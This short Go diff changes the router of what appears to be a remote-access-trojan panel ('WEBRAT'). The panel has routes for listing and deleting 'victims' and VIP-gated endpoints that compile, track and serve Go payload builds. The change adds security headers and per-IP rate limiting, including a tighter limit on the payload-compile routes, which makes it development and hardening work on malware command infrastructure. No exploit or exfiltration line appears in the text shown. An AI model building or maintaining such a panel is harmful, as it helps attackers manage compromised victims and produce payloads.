@@ -62,6 +62,10 @@ func NewRouter(db *storage.DB, hub *ws.Hub) http.Handler {
 	r.Use(middleware.StripSlashes)
 	r.Use(middleware.Compress(5))
 	r.Use(maxBodyMiddleware(256 * 1024))
+	r.Use(securityHeaders)
+
+	globalLimiter := newIPLimiter(10, 30)
+	r.Use(rateLimitMiddleware(globalLimiter))
 
 	r.Use(s.ensureCSRF)
 
@@ -113,10 +117,11 @@ func NewRouter(db *storage.DB, hub *ws.Hub) http.Handler {
 		r.Get("/victims", s.requireVIP(s.handleGetVictims))
 		r.Delete("/victims", s.requireVIP(s.handleDeleteVictim))
 		r.Post("/victims", s.requireVIP(s.handleDeleteVictim))
+		compileLimiter := newIPLimiter(0.1, 2)
 		if envTrue("WEBRAT_ENABLE_COMPILE_GO") {
-			r.Post("/compile-go", s.requireVIP(s.handleCompileGo))
+			r.With(rateLimitMiddleware(compileLimiter)).Post("/compile-go", s.requireVIP(s.handleCompileGo))
 		}
-		r.Post("/compile-go-config", s.requireVIP(s.handleCompileGoConfig))
+		r.With(rateLimitMiddleware(compileLimiter)).Post("/compile-go-config", s.requireVIP(s.handleCompileGoConfig))
 		r.Get("/compile-status", s.requireVIP(s.handleCompileStatus))
 		r.Get("/compile-download", s.requireVIP(s.handleCompileDownload))
 		r.Post("/compile-cancel", s.requireVIP(s.handleCompileCancel))
